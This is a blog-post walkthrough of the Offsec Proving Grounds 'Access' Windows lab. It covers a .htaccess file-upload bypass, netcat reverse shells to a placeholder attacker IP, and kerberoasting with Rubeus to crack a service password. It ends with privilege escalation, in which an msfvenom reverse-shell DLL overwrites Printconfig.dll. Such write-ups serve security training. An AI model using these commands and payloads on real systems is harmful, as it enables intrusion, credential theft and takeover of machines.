---
title: "Proving grounds Play: Access"
layout: post
date: 2023-08-16 12:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Windows
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play windows machine writeup"
---
# Walkthough on Youtube

[![youtube](/assets/images/CTF/Proving_Grounds/Access/yt.png)](https://youtu.be/h1Br5umYxwc)

## Nmap

```sh
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-16 07:12:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49773/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Fuzzing

### Directories

```text
/uploads
/assets
/icons
/forms
```                                

## File Upload Vulnerability

![Upload 01](/assets/images/CTF/Proving_Grounds/Access/up1.png)

Upload a `.htaccess` file to overwrite the file upload configuration in the apache.

**Content of .htacess file**

```text
AddType application/x-httpd-php .evil
```

Upload the php remote code execution code to the server with extension as `rce.evil`

![Upload 02](/assets/images/CTF/Proving_Grounds/Access/up2.png)

### RCE

![RCE 01](/assets/images/CTF/Proving_Grounds/Access/rce1.png)

- Upload netcat windows binary to the server.
- Obtain reverse shell by executing netcat command.

![RCE 02](/assets/images/CTF/Proving_Grounds/Access/rce2.png)

- Transfer PowerView.ps1 to the attacking machine.

**Extract Users Information**

```text
-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt                   
svc_apache               svc_mssql                
The command completed successfully.
```

## Kerberos Abuse

The user `svc_mssql` has Service Principal Name, hence kerberoasting takes place.

```text
serviceprincipalname          : MSSQLSvc/DC.access.offsec
```

[Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

Run as below to obtain NTLM Hash.

```powershell
PS C:\xampp\tmp> .\Rubeus.exe kerberoast /nowrap
```

Copy the hash and crack it using john.

**Crack the hash**

![Crackthehash 02](/assets/images/CTF/Proving_Grounds/Access/crackhash.png)

Transfer [Invoke-Runas.ps1](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1) to the attacking machine. The script will allow us to run commands as certain users in the system using the username and password.

Obtain revese shell for user `svc_mssql` by using the invoke command to trigger the netcat reverse shell.

```powershell
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs svc_mssql trustno1 'C:\xampp\htdocs\uploads\nc.exe <IP> 4444 -e cmd.exe'
```

![Revshell 01](/assets/images/CTF/Proving_Grounds/Access/revshell1.png)

## Privilege Escalation

**Abuse SeChangeNotifyPrivilege.**

```powershell
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

Bypass traverse checking allows us to perform seManageVolumeAbuse by performing dll hijacking.

[SeManageVolumeAbuse](https://github.com/CsEnox/SeManageVolumeExploit)

Transfer the binary to the remote machine and run as `svc_mssql` user.

```powershell
PS C:\xampp\tmp> .\SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
Entries changed: 916
DONE 
```

Create a dll file with windows reverse shell.

```sh
msfvenom -f dll -a x64 -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=9090 -o Printconfig.dll
```

Transfer the dll file to the attacking machine and overwrite the file to the below location.

`C:\Windows\system32\spool\drivers\x64\3\Printconfig.dll`

![Copy](/assets/images/CTF/Proving_Grounds/Access/copy.png)

Switch to powershell and use the below trigger to obtain root.

```powershell
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```
[More...](https://github.com/CsEnox/SeManageVolumeExploit)

![trigger](/assets/images/CTF/Proving_Grounds/Access/trigger.png)

**Root shell Obtained**

![trigger](/assets/images/CTF/Proving_Grounds/Access/root.png)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).